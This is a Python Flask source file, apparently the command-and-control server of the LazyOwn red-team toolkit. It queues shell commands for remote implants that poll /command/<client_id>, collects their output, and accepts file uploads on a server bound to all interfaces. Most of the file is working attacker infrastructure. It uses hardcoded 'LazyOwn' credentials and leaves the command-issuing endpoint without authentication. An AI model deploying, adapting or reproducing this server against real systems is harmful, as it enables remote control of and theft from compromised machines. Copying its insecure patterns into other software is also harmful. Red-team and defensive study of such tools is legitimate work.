from flask import Flask, request, render_template, redirect, url_for, jsonify, Response
import re
import os
import json
import threading
import sys
from functools import wraps


USERNAME = 'LazyOwn'
PASSWORD = 'LazyOwn'

if len(sys.argv) > 1:
    lport = sys.argv[1]
    print(f"    [!] Launch C2 at: {lport}")
else:
    print("    [!] Need pass the port as argument")
    sys.exit(2)

app = Flask(__name__)
commands = {} 
results = {}  
connected_clients = set() 

def check_auth(username, password):
    """Verifica si el usuario y contraseña son correctos"""
    return username == USERNAME and password == PASSWORD

def authenticate():
    """Solitica autenticación"""
    return Response(
        'Invalid credentials. Please provide valid username and password.\n', 
        401, 
        {'WWW-Authenticate': 'Basic realm="Login Required"'}
    )

def requires_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        auth = request.authorization
        if not auth or not check_auth(auth.username, auth.password):
            return authenticate()
        return f(*args, **kwargs)
    return decorated

@app.route('/')
@requires_auth
def index():
    return render_template('index.html', connected_clients=connected_clients, results=results)

@app.route('/command/<client_id>', methods=['GET'])
def send_command(client_id):
    connected_clients.add(client_id) 
    if client_id in commands:
        command = commands.pop(client_id)
        print(f"[INFO] Sending command to {client_id}: {command}")
        return command, 200 
    return '', 204

@app.route('/command/<client_id>', methods=['POST'])
def receive_result(client_id):
    try:
        data = request.json
        if data and 'output' in data:
            output = data['output']
            results[client_id] = output
            print(f"[INFO] Received output from {client_id}: {output}")
            return jsonify({"status": "success"}), 200
        else:
            print(f"[ERROR] Invalid data received from {client_id}")
            return jsonify({"status": "error", "message": "Invalid data format"}), 400
    except json.JSONDecodeError:
        print(f"[ERROR] Invalid JSON received from {client_id}")
        return jsonify({"status": "error", "message": "Invalid JSON"}), 400
    except Exception as e:
        print(f"[ERROR] Unexpected error processing request from {client_id}: {str(e)}")
        return jsonify({"status": "error", "message": "Internal server error"}), 500

@app.route('/issue_command', methods=['POST'])
def issue_command():
    client_id = request.form['client_id']
    command = request.form['command']
    commands[client_id] = command
    return redirect(url_for('index'))

@app.route('/upload', methods=['GET', 'POST'])
@requires_auth
def upload():
    """
    Handle file uploads securely.

    This function allows users to upload files and ensures that the uploaded filename is sanitized
    to prevent directory traversal and other vulnerabilities. Files are saved in a specified uploads directory.

    Returns:
        JSON response indicating the status of the upload or an HTML form for file upload.
    """
    if request.method == 'POST':
        if 'file' not in request.files:
            return jsonify({"status": "error", "message": "No file part"}), 400
        
        file = request.files['file']

        if file.filename == '':
            return jsonify({"status": "error", "message": "No selected file"}), 400
        safe_filename = secure_filename(file.filename)
        path = os.getcwd().replace("modules", "sessions")
        uploads_dir = os.path.join(path, 'uploads')
        os.makedirs(uploads_dir, exist_ok=True)
        filepath = os.path.join(uploads_dir, safe_filename)
        file.save(filepath)  
        print(f"[INFO] File uploaded: {safe_filename}")
        
        return jsonify({"status": "success", "message": f"File uploaded: {safe_filename}"}), 200
    
    return '''
    <!doctype html>
    <title>Upload File</title>
    <h1>Upload a File</h1>
    <form method="POST" enctype="multipart/form-data">
        <input type="file" name="file">
        <input type="submit" value="Upload">
    </form>
    '''

def secure_filename(filename):
    """
    Sanitize the filename to prevent directory traversal and unauthorized access.

    :param filename: The original filename from the upload.
    :return: A sanitized filename that is safe for storage.
    """
    filename = re.sub(r'[^a-zA-Z0-9_.-]', '_', filename)
    return filename[:255]

if __name__ == '__main__':
    path = os.getcwd().replace("modules", "sessions" )
    uploads = f"{path}/uploads"
    if not os.path.exists(uploads):
        os.makedirs(uploads)  
    app.run(host='0.0.0.0', port=lport)
